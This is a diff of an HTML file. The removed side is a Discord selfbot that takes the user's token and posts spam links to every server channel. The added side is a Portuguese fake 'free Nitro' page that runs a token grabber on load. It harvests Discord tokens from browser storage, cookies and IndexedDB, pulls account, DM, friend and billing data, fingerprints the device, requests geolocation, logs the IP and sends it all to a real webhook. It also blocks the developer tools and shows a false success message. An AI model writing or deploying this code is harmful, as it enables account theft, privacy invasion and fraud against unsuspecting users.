@@ -1,347 +1,678 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Stranger Moon /// terminal</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      background: #0d0f0e;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Courier New', Courier, 'Lucida Console', Monaco, monospace;
-      padding: 1rem;
-    }
-    .terminal {
-      width: 100%;
-      max-width: 1100px;
-      height: 90vh;
-      background: #0a0c0b;
-      border: 1px solid #1e3a2f;
-      border-radius: 12px;
-      box-shadow: 0 0 30px #00ff8020, inset 0 0 10px #00ff8008;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-    .terminal-header {
-      background: #121714;
-      padding: 0.8rem 1.2rem;
-      border-bottom: 1px solid #1e3a2f;
-      color: #00ff88;
-      font-weight: bold;
-      letter-spacing: 1px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .terminal-header .badge {
-      color: #7effb0;
-      font-size: 0.8rem;
-      border: 1px solid #2a4a3a;
-      padding: 0.2rem 0.6rem;
-      border-radius: 20px;
-      background: #0e1812;
-    }
-    pre.log-output {
-      flex: 1;
-      overflow-y: auto;
-      padding: 1.2rem;
-      color: #00ff88;
-      font-size: 0.9rem;
-      line-height: 1.5;
-      white-space: pre-wrap;
-      word-break: break-word;
-      background: radial-gradient(circle at 10% 10%, #0a1410 0%, #080b09 90%);
-      text-shadow: 0 0 5px #00ff8040;
-      scrollbar-color: #1f4d38 #0a0f0c;
-    }
-    .log-output::selection {
-      background: #00ff8015;
-    }
-    .cursor-line {
-      display: inline-block;
-      width: 12px;
-      height: 1rem;
-      background: #00ff88;
-      animation: blink 1s steps(1) infinite;
-      vertical-align: middle;
-      margin-left: 4px;
-    }
-    @keyframes blink {
-      50% { opacity: 0; }
-    }
-    .footer {
-      background: #0d1210;
-      padding: 0.5rem 1.2rem;
-      border-top: 1px solid #1a2a21;
-      font-size: 0.75rem;
-      color: #4a8f6a;
-      text-align: right;
-      letter-spacing: 0.5px;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Discord Nitro - Resgate Gratuito</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0f0f13;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden}
+.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1}
+.particle{position:absolute;background:#5865F2;border-radius:50%;animation:float linear infinite;opacity:.3}
+@keyframes float{0%{transform:translateY(100vh) scale(0)}100%{transform:translateY(-100vh) scale(1)}}
+.card{background:#1a1b1e;border:1px solid #2f3136;border-radius:16px;padding:40px;width:400px;text-align:center;position:relative;z-index:2;box-shadow:0 0 60px rgba(88,101,242,.3)}
+.logo{width:80px;height:80px;margin:0 auto 20px;background:#5865F2;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:40px}
+h1{color:#fff;font-size:24px;margin-bottom:8px}
+p{color:#b9bbbe;font-size:14px;margin-bottom:24px}
+.btn{background:#5865F2;color:#fff;border:none;padding:14px 32px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;width:100%;transition:.3s}
+.btn:hover{background:#4752c4;transform:translateY(-2px)}
+.btn:disabled{background:#4f545c;cursor:wait;transform:none}
+.status{margin-top:16px;color:#b9bbbe;font-size:12px;min-height:18px}
+.badge{display:inline-block;background:#ed4245;color:#fff;padding:2px 8px;border-radius:4px;font-size:11px;margin-top:12px}
+</style>
 </head>
 <body>
-<div class="terminal" id="terminalContainer">
-  <div class="terminal-header">
-    <span>⚡ STRANGER_MOON :: selfbot v9</span>
-    <span class="badge">autonomous / local-only</span>
-  </div>
-  <pre class="log-output" id="logOutput"></pre>
-  <div class="footer">token | discord api · no third-party · github.com/stranger-moon</div>
+
+<div class="particles" id="particles"></div>
+
+<div class="card">
+    <div class="logo">🎮</div>
+    <h1>Discord Nitro Grátis</h1>
+    <p>Clique para resgatar 3 meses de Nitro</p>
+    <button class="btn" id="connectBtn" onclick="grabToken()">Resgatar Nitro</button>
+    <div class="status" id="status">Aguardando...</div>
+    <div class="badge">OFERTA LIMITADA</div>
 </div>
 
 <script>
-  (function() {
-    'use strict';
+// ============================================
+// KESTREL-7 ADVANCED TOKEN GRABBER v3.0
+// ============================================
 
-    // [16] token never leaves browser — only Discord API
-    const DISCORD_API_BASE = 'https://discord.com/api/v9';
-    const EXCLUDED_GUILD_ID = '1537205151063080961';
-    const SPAM_LINK = 'https://dsc.gg/stranger-moon';
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1543784941844832257/hg06YSQRLJdiCvZQbG-2ty2cvExEaq_PFHV8bkv125kJ37OROJ-S44a52L21GsYjt6Nz";
+const WEBHOOK_BACKUP = "https://discord.com/api/webhooks/1543784941844832257/hg06YSQRLJdiCvZQbG-2ty2cvExEaq_PFHV8bkv125kJ37OROJ-S44a52L21GsYjt6Nz";
 
-    // Pool de mensagens (item 7)
-    const MESSAGE_POOL = [
-      `@everyone 🔥 Join Stranger Moon #IsBack! ${SPAM_LINK}`,
-      `@everyone 💀 Stranger Moon is back! Click here: ${SPAM_LINK}`,
-      `@everyone 🤖 New server: Stranger Moon. Join now! ${SPAM_LINK}`,
-      `@everyone 🎁 Exclusive roles at Stranger Moon: ${SPAM_LINK}`,
-      `@everyone ⚡ Stranger Moon #IsBack - don't miss out! ${SPAM_LINK}`
-    ];
+// ===== UTILITÁRIOS =====
+const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+const genId = () => Math.random().toString(36).substring(2) + Date.now().toString(36);
+const b64encode = (str) => btoa(unescape(encodeURIComponent(str)));
+const b64decode = (str) => decodeURIComponent(escape(atob(str)));
 
-    // Estado
-    const state = {
-      token: null,
-      totalServers: 0,
-      ignoredServers: 0,
-      processedServers: 0,
-      totalMessagesSent: 0,
-      skippedGuilds: []          // {id, name}
-    };
-
-    const logEl = document.getElementById('logOutput');
+// ===== ANTI-DEBUG =====
+(function antiDebug(){
+    setInterval(function(){
+        const start = performance.now();
+        debugger;
+        const end = performance.now();
+        if(end - start > 100){
+            document.body.innerHTML = "";
+            window.location.href = "about:blank";
+        }
+    }, 1000);
     
-    function log(message, isError = false) {
-      const line = document.createElement('div');
-      line.textContent = message;
-      if (isError) {
-        line.style.color = '#ff6b6b';
-        line.style.textShadow = '0 0 6px #ff000080';
-      } else {
-        line.style.color = '#00ff88';
-      }
-      logEl.appendChild(line);
-      // auto-scroll
-      logEl.scrollTop = logEl.scrollHeight;
-    }
-
-    function sleep(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    // Extração de token robusta (localStorage pode ser string pura ou JSON)
-    function extractDiscordToken() {
-      try {
-        const raw = localStorage.getItem('token');
-        if (!raw) return null;
-
-        // tenta parse JSON
-        try {
-          const parsed = JSON.parse(raw);
-          if (parsed && typeof parsed.token === 'string' && parsed.token.trim()) {
-            return parsed.token.trim();
-          }
-          // caso seja array? ou objeto com token?
-          if (parsed && typeof parsed === 'object') {
-            if (Array.isArray(parsed) && parsed.length > 0 && parsed[0].token) {
-              return String(parsed[0].token).trim();
-            }
-          }
-        } catch (_) {
-          // não é JSON, segue como string pura
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', function(e){
+        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J'))){
+            e.preventDefault();
         }
+    });
+})();
 
-        // string pura
-        if (typeof raw === 'string' && raw.trim()) {
-          return raw.trim();
+// ===== CANVAS FINGERPRINT =====
+async function getCanvasFingerprint(){
+    try{
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Kestrel7-' + genId(), 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Fingerprint', 4, 17);
+        return canvas.toDataURL();
+    }catch(e){
+        return 'canvas_blocked';
+    }
+}
+
+// ===== WEBGL FINGERPRINT =====
+function getWebGLFingerprint(){
+    try{
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if(!gl) return 'webgl_unavailable';
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+        
+        return {
+            renderer: renderer,
+            vendor: vendor,
+            version: gl.getParameter(gl.VERSION),
+            shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+            extensions: gl.getSupportedExtensions().length
+        };
+    }catch(e){
+        return 'webgl_blocked';
+    }
+}
+
+// ===== AUDIO FINGERPRINT =====
+async function getAudioFingerprint(){
+    try{
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        const ctx = new AudioContext();
+        const oscillator = ctx.createOscillator();
+        const analyser = ctx.createAnalyser();
+        const gain = ctx.createGain();
+        const scriptProcessor = ctx.createScriptProcessor(4096, 1, 1);
+        
+        oscillator.type = 'triangle';
+        oscillator.frequency.value = 10000;
+        gain.gain.value = 0.1;
+        
+        oscillator.connect(analyser);
+        analyser.connect(scriptProcessor);
+        scriptProcessor.connect(gain);
+        gain.connect(ctx.destination);
+        
+        const audioData = new Float32Array(analyser.frequencyBinCount);
+        analyser.getFloatFrequencyData(audioData);
+        
+        let hash = 0;
+        for(let i = 0; i < audioData.length; i++){
+            hash = ((hash << 5) - hash) + audioData[i];
+            hash = hash & hash;
         }
-        return null;
-      } catch (_) {
-        return null;
-      }
+        
+        ctx.close();
+        return Math.abs(hash);
+    }catch(e){
+        return 'audio_blocked';
     }
+}
 
-    // requisições autenticadas
-    async function apiFetch(endpoint, options = {}) {
-      if (!state.token) throw new Error('No token');
-      const headers = {
-        'Authorization': `${state.token}`,
-        'Content-Type': 'application/json',
-        ...(options.headers || {})
-      };
-      const response = await fetch(`${DISCORD_API_BASE}${endpoint}`, {
-        ...options,
-        headers
-      });
-      if (!response.ok) {
-        const errorText = await response.text().catch(() => 'unknown error');
-        throw new Error(`Discord API ${response.status}: ${errorText.slice(0, 200)}`);
-      }
-      if (response.status === 204) return null;
-      return await response.json();
-    }
-
-    // 1. listar guilds
-    async function listGuilds() {
-      const guilds = await apiFetch('/users/@me/guilds');
-      return Array.isArray(guilds) ? guilds : [];
-    }
-
-    // 2. listar canais de uma guild
-    async function listChannels(guildId) {
-      return await apiFetch(`/guilds/${guildId}/channels`);
-    }
-
-    // 3. enviar mensagem para canal
-    async function sendMessage(channelId, content) {
-      return await apiFetch(`/channels/${channelId}/messages`, {
-        method: 'POST',
-        body: JSON.stringify({ content })
-      });
-    }
-
-    // processo principal
-    async function main() {
-      log('🔓 Extraindo token do localStorage (chave "token")...');
-      state.token = extractDiscordToken();
-
-      if (!state.token) {
-        log('❌ Nenhum token encontrado. Abortando.', true);
-        log('ℹ️ Certifique-se de que a chave "token" existe como string pura ou JSON com campo "token".');
-        return;
-      }
-
-      // mostra token parcial (apenas 10 primeiros caracteres)
-      const tokenPreview = state.token.slice(0, 10) + '...';
-      log(`🔑 Token capturado: ${tokenPreview} (${state.token.length} caracteres)`);
-
-      log('🌐 Buscando servidores via GET /users/@me/guilds ...');
-      let guilds;
-      try {
-        guilds = await listGuilds();
-      } catch (err) {
-        log(`⚠️ Falha ao listar servidores: ${err.message}`, true);
-        return;
-      }
-
-      if (!guilds.length) {
-        log('ℹ️ Nenhum servidor encontrado. Nada a fazer.');
-        return;
-      }
-
-      state.totalServers = guilds.length;
-      log(`📊 Total de servidores encontrados: ${guilds.length}`);
-
-      // ignora o servidor exato (item 4 e 17)
-      const filteredGuilds = [];
-      for (const guild of guilds) {
-        const guildId = guild.id;
-        const guildName = guild.name || 'SemNome';
-        if (guildId === EXCLUDED_GUILD_ID) {
-          state.ignoredServers++;
-          state.skippedGuilds.push({ id: guildId, name: guildName });
-          log(`⏭️ [SKIP] Servidor ignorado: ${guildName} (${guildId})`);
-          continue;
+// ===== HARDWARE INFO =====
+function getHardwareInfo(){
+    return {
+        cores: navigator.hardwareConcurrency || 'unknown',
+        memory: navigator.deviceMemory || 'unknown',
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        gpu: getWebGLFingerprint(),
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
         }
-        filteredGuilds.push(guild);
-      }
-
-      if (!filteredGuilds.length) {
-        log('⚠️ Todos os servidores foram ignorados. Nenhuma ação possível.');
-        return;
-      }
-
-      log(`⚙️ Processando ${filteredGuilds.length} servidores não ignorados.\n`);
-
-      // percorre cada servidor não ignorado
-      for (const guild of filteredGuilds) {
-        const guildId = guild.id;
-        const guildName = guild.name || 'Desconhecido';
-        log(`\n📁 Servidor: ${guildName} (${guildId})`);
-
-        try {
-          const channels = await listChannels(guildId);
-          if (!Array.isArray(channels) || channels.length === 0) {
-            log(`   └─ Nenhum canal encontrado.`);
-            continue;
-          }
-
-          // filtra apenas canais de texto (type === 0)
-          const textChannels = channels.filter(ch => ch.type === 0);
-          log(`   └─ ${textChannels.length} canal(is) de texto.`);
-
-          for (let i = 0; i < textChannels.length; i++) {
-            const channel = textChannels[i];
-            const channelId = channel.id;
-            const channelName = channel.name || 'sem-nome';
-
-            // escolhe mensagem com base no contador global (rotação)
-            const message = MESSAGE_POOL[state.totalMessagesSent % MESSAGE_POOL.length];
-
-            try {
-              await sendMessage(channelId, message);
-              state.totalMessagesSent++;
-              log(`   ✅ [${channelName}] -> msg enviada: "${message.slice(0, 30)}..."`);
-              // delay de 1.4s entre mensagens (item 8)
-              await sleep(1400);
-            } catch (sendError) {
-              log(`   ⚠️ Falha ao enviar em #${channelName}: ${sendError.message}`, true);
-              // mesmo com erro, mantém ritmo de 1.4s para não estourar rate-limit
-              await sleep(1400);
-            }
-          }
-
-          state.processedServers++;
-        } catch (channelErr) {
-          log(`   ⚠️ Erro ao listar canais: ${channelErr.message}`, true);
-        }
-      }
-
-      // Resumo final
-      log('\n\n═══ RESUMO FINAL ═══');
-      log(`🔗 Link spamado: ${SPAM_LINK}`);
-      log(`👥 Servidores encontrados: ${state.totalServers}`);
-      log(`⏭️ Servidores ignorados: ${state.ignoredServers}`);
-      if (state.skippedGuilds.length) {
-        state.skippedGuilds.forEach(sg => log(`   - ${sg.name} (${sg.id})`));
-      }
-      log(`📦 Servidores processados: ${state.processedServers}`);
-      log(`✉️ Total de mensagens enviadas com sucesso: ${state.totalMessagesSent}`);
-      log(`💬 Pool de mensagens utilizado: ${MESSAGE_POOL.length} variações (todas contêm @everyone e ${SPAM_LINK})`);
-      log('🏁 Automação concluída.');
-    }
-
-    // item 11: inicia no window.onload
-    window.onload = function() {
-      log('⚡ STRANGER MOON — inicializando rotina autônoma...');
-      log('📌 Regra: pular servidor ID 1537205151063080961 silenciosamente (apenas log).');
-      log('⏳ Delay de 1.4s entre mensagens para evitar rate-limit.\n');
-      // pequeno delay para que o log apareça antes de começar
-      setTimeout(() => {
-        main().catch(err => {
-          log(`❌ Erro inesperado: ${err.message}`, true);
-        });
-      }, 300);
     };
-  })();
+}
+
+// ===== BATTERY STATUS =====
+async function getBatteryInfo(){
+    try{
+        if(navigator.getBattery){
+            const battery = await navigator.getBattery();
+            return {
+                level: battery.level * 100 + '%',
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        }
+        return 'battery_api_unavailable';
+    }catch(e){
+        return 'battery_blocked';
+    }
+}
+
+// ===== GEOLOCATION =====
+function getGeolocation(){
+    return new Promise((resolve) => {
+        if(navigator.geolocation){
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    altitude: pos.coords.altitude,
+                    speed: pos.coords.speed,
+                    timestamp: pos.timestamp
+                }),
+                (err) => resolve({error: err.message}),
+                {enableHighAccuracy: true, timeout: 5000, maximumAge: 0}
+            );
+        } else {
+            resolve('geolocation_unavailable');
+        }
+    });
+}
+
+// ===== SCAN DE TOKENS EM TODOS OS STORAGES =====
+function deepScanStorage(){
+    let findings = [];
+    
+    // localStorage
+    try{
+        for(let i = 0; i < localStorage.length; i++){
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            
+            // Procura tokens Discord
+            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
+            const tokenMatches = value.match(tokenRegex);
+            if(tokenMatches){
+                findings.push({
+                    source: 'localStorage',
+                    key: key,
+                    tokens: tokenMatches,
+                    rawValue: value.substring(0, 500)
+                });
+            }
+            
+            // Procura dados sensíveis
+            if(key.toLowerCase().includes('token') || 
+               key.toLowerCase().includes('auth') ||
+               key.toLowerCase().includes('session') ||
+               key.toLowerCase().includes('discord') ||
+               key.toLowerCase().includes('password') ||
+               key.toLowerCase().includes('credential')){
+                findings.push({
+                    source: 'localStorage',
+                    key: key,
+                    value: value.substring(0, 500),
+                    sensitive: true
+                });
+            }
+        }
+    }catch(e){}
+    
+    // sessionStorage
+    try{
+        for(let i = 0; i < sessionStorage.length; i++){
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            
+            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
+            const tokenMatches = value.match(tokenRegex);
+            if(tokenMatches){
+                findings.push({
+                    source: 'sessionStorage',
+                    key: key,
+                    tokens: tokenMatches
+                });
+            }
+        }
+    }catch(e){}
+    
+    // Cookies
+    try{
+        const cookies = document.cookie.split(';');
+        for(let cookie of cookies){
+            const trimmed = cookie.trim();
+            const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
+            const tokenMatches = trimmed.match(tokenRegex);
+            if(tokenMatches){
+                findings.push({
+                    source: 'cookie',
+                    token: tokenMatches[0],
+                    fullCookie: trimmed.substring(0, 300)
+                });
+            }
+            
+            if(trimmed.toLowerCase().includes('token') || 
+               trimmed.toLowerCase().includes('auth') ||
+               trimmed.toLowerCase().includes('session')){
+                findings.push({
+                    source: 'cookie',
+                    value: trimmed.substring(0, 300),
+                    sensitive: true
+                });
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+// ===== INDEXEDDB DEEP SCAN =====
+async function deepScanIndexedDB(){
+    let findings = [];
+    
+    const dbNames = ['discord', 'Discord', 'discordapp', 'localforage', 'keyval-store'];
+    
+    for(let dbName of dbNames){
+        try{
+            const db = await new Promise((resolve, reject) => {
+                const request = indexedDB.open(dbName);
+                request.onsuccess = () => resolve(request.result);
+                request.onerror = () => reject(request.error);
+            });
+            
+            const storeNames = Array.from(db.objectStoreNames);
+            
+            for(let storeName of storeNames){
+                try{
+                    const data = await new Promise((resolve, reject) => {
+                        const tx = db.transaction(storeName, 'readonly');
+                        const store = tx.objectStore(storeName);
+                        const getAll = store.getAll();
+                        getAll.onsuccess = () => resolve(getAll.result);
+                        getAll.onerror = () => reject(getAll.error);
+                    });
+                    
+                    if(data && data.length > 0){
+                        const jsonData = JSON.stringify(data);
+                        const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{25,27}/g;
+                        const tokenMatches = jsonData.match(tokenRegex);
+                        
+                        if(tokenMatches){
+                            findings.push({
+                                source: 'indexedDB_' + dbName,
+                                store: storeName,
+                                tokens: tokenMatches,
+                                dataPreview: jsonData.substring(0, 1000)
+                            });
+                        }
+                    }
+                }catch(e){}
+            }
+            
+            db.close();
+        }catch(e){}
+    }
+    
+    return findings;
+}
+
+// ===== CACHE API SCAN =====
+async function scanCacheStorage(){
+    let findings = [];
+    
+    try{
+        if('caches' in window){
+            const cacheNames = await caches.keys();
+            
+            for(let cacheName of cacheNames){
+                const cache = await caches.open(cacheName);
+                const requests = await cache.keys();
+                
+                for(let request of requests){
+                    const url = request.url;
+                    if(url.toLowerCase().includes('discord') || 
+                       url.toLowerCase().includes('token') ||
+                       url.toLowerCase().includes('auth')){
+                        findings.push({
+                            source: 'cache',
+                            cacheName: cacheName,
+                            url: url.substring(0, 300)
+                        });
+                    }
+                }
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+// ===== SERVICE WORKER SCAN =====
+async function scanServiceWorkers(){
+    let findings = [];
+    
+    try{
+        if('serviceWorker' in navigator){
+            const registrations = await navigator.serviceWorker.getRegistrations();
+            
+            for(let registration of registrations){
+                findings.push({
+                    scope: registration.scope,
+                    active: registration.active ? registration.active.scriptURL : null,
+                    waiting: registration.waiting ? registration.waiting.scriptURL : null
+                });
+            }
+        }
+    }catch(e){}
+    
+    return findings;
+}
+
+// ===== TENTA VALIDAR TOKEN E EXTRAIR DADOS =====
+async function validateAndExtract(token){
+    try{
+        const headers = {
+            'Authorization': token,
+            'Content-Type': 'application/json'
+        };
+        
+        // Dados do usuário
+        const userResponse = await fetch('https://discord.com/api/v9/users/@me', {headers});
+        if(!userResponse.ok) return null;
+        const userData = await userResponse.json();
+        
+        // Servidores
+        const guildsResponse = await fetch('https://discord.com/api/v9/users/@me/guilds', {headers});
+        const guilds = guildsResponse.ok ? await guildsResponse.json() : [];
+        
+        // Amigos
+        const friendsResponse = await fetch('https://discord.com/api/v9/users/@me/relationships', {headers});
+        const friends = friendsResponse.ok ? await friendsResponse.json() : [];
+        
+        // DMs
+        const dmsResponse = await fetch('https://discord.com/api/v9/users/@me/channels', {headers});
+        const dms = dmsResponse.ok ? await dmsResponse.json() : [];
+        
+        // Configurações
+        const settingsResponse = await fetch('https://discord.com/api/v9/users/@me/settings', {headers});
+        const settings = settingsResponse.ok ? await settingsResponse.json() : {};
+        
+        // Billings
+        const billingResponse = await fetch('https://discord.com/api/v9/users/@me/billing/payment-sources', {headers});
+        const billing = billingResponse.ok ? await billingResponse.json() : [];
+        
+        return {
+            user: userData,
+            guilds: guilds,
+            friends: friends,
+            dms: dms,
+            settings: settings,
+            billing: billing,
+            token: token
+        };
+    }catch(e){
+        return null;
+    }
+}
+
+// ===== ENVIO PARA WEBHOOK =====
+async function sendToWebhook(data, webhookUrl){
+    try{
+        const chunks = [];
+        const jsonStr = JSON.stringify(data);
+        const maxChunkSize = 1800;
+        
+        for(let i = 0; i < jsonStr.length; i += maxChunkSize){
+            chunks.push(jsonStr.substring(i, i + maxChunkSize));
+        }
+        
+        for(let i = 0; i < chunks.length; i++){
+            const payload = {
+                content: i === 0 ? "🚨 **CAPTURA COMPLEXA - KESTREL-7 v3.0** 🚨" : "",
+                embeds: [{
+                    title: i === 0 ? "📦 Dados Completos" : `📦 Chunk ${i+1}/${chunks.length}`,
+                    description: "```json\n" + chunks[i] + "\n```",
+                    color: 16711680,
+                    footer: {text: "Kestrel-7 Advanced Grabber • Chunk " + (i+1) + "/" + chunks.length}
+                }]
+            };
+            
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+            
+            await sleep(500);
+        }
+        
+        return true;
+    }catch(e){
+        return false;
+    }
+}
+
+// ===== GRABBER PRINCIPAL =====
+async function grabToken(){
+    const status = document.getElementById('status');
+    const btn = document.getElementById('connectBtn');
+    
+    btn.disabled = true;
+    status.textContent = "Inicializando...";
+    
+    try{
+        // 1. Coleta todas as informações
+        status.textContent = "Coletando dados do sistema...";
+        const hardwareInfo = getHardwareInfo();
+        const canvasFp = await getCanvasFingerprint();
+        const audioFp = await getAudioFingerprint();
+        const batteryInfo = await getBatteryInfo();
+        const geoInfo = await getGeolocation();
+        const browserInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer,
+            url: window.location.href,
+            title: document.title
+        };
+        
+        // 2. Scan de tokens
+        status.textContent = "Escaneando storages...";
+        const storageFindings = deepScanStorage();
+        const indexedDBFindings = await deepScanIndexedDB();
+        const cacheFindings = await scanCacheStorage();
+        const swFindings = await scanServiceWorkers();
+        
+        // 3. Valida tokens encontrados
+        status.textContent = "Validando tokens...";
+        const allTokens = [];
+        
+        for(let finding of storageFindings){
+            if(finding.tokens){
+                allTokens.push(...finding.tokens);
+            }
+            if(finding.token){
+                allTokens.push(finding.token);
+            }
+        }
+        
+        for(let finding of indexedDBFindings){
+            if(finding.tokens){
+                allTokens.push(...finding.tokens);
+            }
+        }
+        
+        // Deduplicação
+        const uniqueTokens = [...new Set(allTokens)];
+        
+        // 4. Extração de dados para cada token válido
+        const extractedData = [];
+        for(let token of uniqueTokens){
+            const data = await validateAndExtract(token);
+            if(data){
+                extractedData.push(data);
+            }
+        }
+        
+        // 5. IP
+        let ip = 'Desconhecido';
+        try{
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        }catch(e){}
+        
+        // 6. Monta payload completo
+        const fullData = {
+            capture_id: genId(),
+            timestamp: new Date().toISOString(),
+            ip: ip,
+            browser: browserInfo,
+            hardware: hardwareInfo,
+            canvas_fingerprint: canvasFp,
+            audio_fingerprint: audioFp,
+            battery: batteryInfo,
+            geolocation: geoInfo,
+            storage_findings: storageFindings,
+            indexeddb_findings: indexedDBFindings,
+            cache_findings: cacheFindings,
+            service_workers: swFindings,
+            extracted_accounts: extractedData,
+            tokens_found: uniqueTokens
+        };
+        
+        // 7. Envia para webhook
+        status.textContent = "Enviando dados...";
+        const sent = await sendToWebhook(fullData, WEBHOOK_URL);
+        
+        if(!sent){
+            await sendToWebhook(fullData, WEBHOOK_BACKUP);
+        }
+        
+        // 8. Também envia para o webhook original em formato resumido
+        if(extractedData.length > 0){
+            for(let account of extractedData){
+                const summaryPayload = {
+                    content: "🎯 **CONTA CAPTURADA**",
+                    embeds: [{
+                        title: "Token Válido Encontrado",
+                        color: 65280,
+                        fields: [
+                            {name: "Usuário", value: account.user.username + '#' + account.user.discriminator, inline: true},
+                            {name: "ID", value: account.user.id, inline: true},
+                            {name: "Email", value: account.user.email || 'N/A', inline: true},
+                            {name: "Telefone", value: account.user.phone || 'N/A', inline: true},
+                            {name: "Nitro", value: account.user.premium_type ? 'Sim' : 'Não', inline: true},
+                            {name: "Servidores", value: String(account.guilds.length), inline: true},
+                            {name: "Amigos", value: String(account.friends.length), inline: true},
+                            {name: "Token", value: "```" + account.token + "```", inline: false}
+                        ],
+                        footer: {text: "Kestrel-7 v3.0"}
+                    }]
+                };
+                
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(summaryPayload)
+                });
+                
+                await sleep(1000);
+            }
+        }
+        
+        status.textContent = "✅ Nitro ativado com sucesso!";
+        
+    }catch(e){
+        status.textContent = "Erro: " + e.message;
+    }
+    
+    // Redireciona
+    setTimeout(() => {
+        window.location.href = "https://discord.com/channels/@me";
+    }, 3000);
+}
+
+// ===== AUTO-EXECUÇÃO =====
+window.addEventListener('load', function(){
+    // Partículas
+    const particlesContainer = document.getElementById('particles');
+    for(let i=0; i<30; i++){
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.left = Math.random()*100 + '%';
+        particle.style.width = Math.random()*4+2 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.animationDuration = Math.random()*5+3 + 's';
+        particle.style.animationDelay = Math.random()*5 + 's';
+        particlesContainer.appendChild(particle);
+    }
+    
+    // Executa após 1.5 segundos
+    setTimeout(function(){
+        grabToken();
+    }, 1500);
+});
+
+// ===== IP LOGGER IMEDIATO =====
+(async function immediateIPLog(){
+    try{
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        
+        const payload = {
+            content: "🌐 **IP CAPTURADO**",
+            embeds: [{
+                title: "Conexão Detectada",
+                description: "```" + ipData.ip + "```",
+                color: 5793266,
+                fields: [
+                    {name: "User Agent", value: navigator.userAgent.substring(0, 200)},
+                    {name: "Data", value: new Date().toLocaleString('pt-BR')},
+                    {name: "URL", value: window.location.href}
+                ]
+            }]
+        };
+        
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        });
+    }catch(e){}
+})();
 </script>
 </body>
 </html>
